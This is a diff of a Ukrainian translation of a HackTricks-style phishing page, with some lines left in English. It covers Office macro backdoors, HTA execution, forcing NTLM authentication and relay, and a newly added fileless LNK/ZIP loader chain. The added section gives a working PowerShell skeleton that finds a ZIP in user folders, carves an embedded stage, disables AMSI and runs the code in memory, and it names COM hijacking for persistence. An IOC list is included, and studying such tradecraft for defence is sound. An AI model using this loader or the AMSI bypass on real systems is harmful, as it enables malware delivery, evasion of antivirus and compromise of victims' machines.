@@ -1,35 +1,35 @@
-# Phishing Files & Documents
+# Phishing Файли та документи
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Documents
+## Документи Office
 
-Microsoft Word виконує валідацію даних файлу перед його відкриттям. Валідація даних виконується у формі ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає помилка, файл, що аналізується, не буде відкритий.
+Microsoft Word виконує валідацію даних файлу перед його відкриттям. Валідація даних проводиться шляхом ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає будь-яка помилка, аналізований файл не буде відкрито.
 
-Зазвичай файли Word, що містять макроси, використовують розширення `.docm`. Однак можливо перейменувати файл, змінивши розширення файлу, і все ще зберегти їх можливості виконання макросів.\
-Наприклад, файл RTF за замовчуванням не підтримує макроси, але файл DOCM, перейменований в RTF, буде оброблений Microsoft Word і зможе виконувати макроси.\
-Ті ж самі внутрішні механізми застосовуються до всього програмного забезпечення Microsoft Office Suite (Excel, PowerPoint тощо).
+Зазвичай файли Word, що містять макроси, мають розширення `.docm`. Однак можна перейменувати файл, змінивши розширення, і при цьому зберегти можливість виконання макросів.\
+Наприклад, файл RTF за замовчуванням не підтримує макроси, але файл DOCM, перейменований у RTF, буде оброблений Microsoft Word і зможе виконувати макроси.\
+Ті самі внутрішні механізми застосовуються до всього програмного забезпечення Microsoft Office Suite (Excel, PowerPoint тощо).
 
-Ви можете використовувати наступну команду, щоб перевірити, які розширення будуть виконані деякими програмами Office:
+Ви можете використати наступну команду, щоб перевірити, які розширення будуть виконуватися деякими програмами Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX файли, що посилаються на віддалений шаблон (Файл – Параметри – Додатки – Керувати: Шаблони – Перейти), можуть також "виконувати" макроси.
+DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
 
-### Завантаження зовнішнього зображення
+### Зовнішнє завантаження зображення
 
-Перейдіть до: _Вставити --> Швидкі елементи --> Поле_\
-_**Категорії**: Посилання та довідки, **Імена полів**: includePicture, і **Ім'я файлу або URL**:_ http://\<ip>/whatever
+Перейдіть до: _Insert --> Quick Parts --> Field_\
+_**Categories**: Links and References, **Filed names**: includePicture, і **Filename or URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
-### Макроси Бекдор
+### Бекдор через макроси
 
-Можливо використовувати макроси для виконання довільного коду з документа.
+It's possible to use macros to run arbitrary code from the document.
 
-#### Автозавантажувані функції
+#### Функції автозавантаження
 
-Чим поширеніші вони, тим більше ймовірність, що антивірус їх виявить.
+The more common they are, the more probable the AV will detect them.
 
 - AutoOpen()
 - Document_Open()
@@ -70,8 +70,8 @@ proc.Create "powershell <beacon line generated>
 
 #### Розширення документа
 
-Коли закінчите, виберіть випадаючий список **Save as type**, змініть формат з **`.docx`** на **Word 97-2003 `.doc`**.\
-Зробіть це, тому що ви **не можете зберегти макроси всередині `.docx`** і є **стигма** **навколо** розширення, що підтримує макроси **`.docm`** (наприклад, значок ескізу має величезний `!`, і деякі веб/електронні шлюзи блокують їх повністю). Тому це **спадкове розширення `.doc` є найкращим компромісом**.
+Після завершення виберіть випадаючий список **Save as type**, змініть формат з **`.docx`** на **Word 97-2003 `.doc`**.\
+Робіть це, оскільки ви **не можете зберегти макроси всередині `.docx`** і існує **стигма** навколо макро-увімкненого розширення **`.docm`** (напр., значок ескізу має величезний `!` і деякі веб/електронні шлюзи їх узагалі блокують). Тому це **застаріле розширення `.doc` є найкращим компромісом**.
 
 #### Генератори шкідливих макросів
 
@@ -79,11 +79,11 @@ proc.Create "powershell <beacon line generated>
 - [**macphish**](https://github.com/cldrn/macphish)
 - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Файли
+## Файли HTA
 
-HTA - це програма Windows, яка **поєднує HTML та мови сценаріїв (такі як VBScript та JScript)**. Вона генерує інтерфейс користувача та виконується як "повністю довірена" програма, без обмежень моделі безпеки браузера.
+HTA — це програма для Windows, яка **поєднує HTML та скриптові мови (наприклад VBScript і JScript)**. Вона генерує інтерфейс користувача та виконується як «повністю довірена» програма, без обмежень моделі безпеки браузера.
 
-HTA виконується за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, що робить **`mshta` залежним від IE**. Тому, якщо він був видалений, HTA не зможуть виконуватися.
+HTA виконується за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, через що **`mshta` залежний від IE**. Тому якщо його було видалено, HTA не зможуть виконуватися.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -138,11 +138,11 @@ var_func
 self.close
 </script>
 ```
-## Примус NTLM аутентифікації
+## Примушування NTLM автентифікації
 
-Існує кілька способів **примусити NTLM аутентифікацію "віддалено"**, наприклад, ви можете додати **невидимі зображення** до електронних листів або HTML, до яких отримувач отримуватиме доступ (навіть HTTP MitM?). Або надіслати жертві **адресу файлів**, які **спровокують** **аутентифікацію** лише для **відкриття папки.**
+Існує кілька способів **примусити NTLM автентифікацію "віддалено"**, наприклад, ви можете додати **невидимі зображення** до електронних листів або HTML, до яких користувач звернеться (навіть HTTP MitM?). Або надіслати жертві **адресу файлів**, які **спровокують** **автентифікацію** лише при **відкритті папки.**
 
-**Перевірте ці ідеї та більше на наступних сторінках:**
+**Перевірте ці ідеї та інші на наступних сторінках:**
 
 
 {{#ref}}
@@ -154,11 +154,62 @@ self.close
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
-### NTLM Реле
+### NTLM Relay
 
-Не забувайте, що ви можете не лише вкрасти хеш або аутентифікацію, але й **виконувати атаки NTLM реле**:
+Не забувайте, що ви можете не лише вкрасти хеш або автентифікацію, а й **perform NTLM relay attacks**:
 
-- [**Атаки NTLM реле**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-- [**AD CS ESC8 (NTLM реле до сертифікатів)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+
+## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
+
+Дуже ефективні кампанії доставляють ZIP, який містить два легітимні приманкові документи (PDF/DOCX) та шкідливий .lnk. Фішка в тому, що фактичний PowerShell loader зберігається всередині сирих байтів ZIP після унікального маркера, а .lnk вирізає й запускає його повністю в пам'яті.
+
+Типовий потік, реалізований .lnk PowerShell one-liner:
+
+1) Знайти оригінальний ZIP у загальних шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, та батьківській директорії поточного робочого каталогу.
+2) Прочитати байти ZIP і знайти хардкоджений маркер (наприклад, xFIQCV). Все, що йде після маркера — це вбудований PowerShell payload.
+3) Скопіювати ZIP до %ProgramData%, розпакувати там і відкрити приманковий .docx, щоб виглядати легітимно.
+4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
+5) Деобфускувати наступний етап (наприклад, видалити всі символи #) і виконати його в пам'яті.
+
+Example PowerShell skeleton to carve and run the embedded stage:
+```powershell
+$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
+$paths    = @(
+"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
+"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
+)
+$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+if(-not $zip){ return }
+$bytes = [IO.File]::ReadAllBytes($zip.FullName)
+$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
+if($idx -lt 0){ return }
+$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
+$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+Invoke-Expression $code
+```
+Примітки
+- Доставку часто здійснюють через авторитетні піддомени PaaS (e.g., *.herokuapp.com) і можуть обмежувати доступ до payloads (надавати безпечні ZIPs залежно від IP/UA).
+- Наступний етап часто розшифровує base64/XOR shellcode і виконує його через Reflection.Emit + VirtualAlloc, щоб мінімізувати артефакти на диску.
+
+Persistence used in the same chain
+- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:
+
+{{#ref}}
+../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
+{{#endref}}
+
+Пошук/IOCs
+- ZIP-файли, які містять ASCII-маркер (e.g., xFIQCV), доданий до даних архіву.
+- .lnk, що перераховує батьківські/користувацькі папки для пошуку ZIP і відкриває підставний документ.
+- Маніпуляції з AMSI через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
+- Довготривалі бізнес-переписки, що закінчуються посиланнями, розміщеними на довірених PaaS-доменах.
+
+## Джерела
+
+- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
 
 {{#include ../../banners/hacktricks-training.md}}
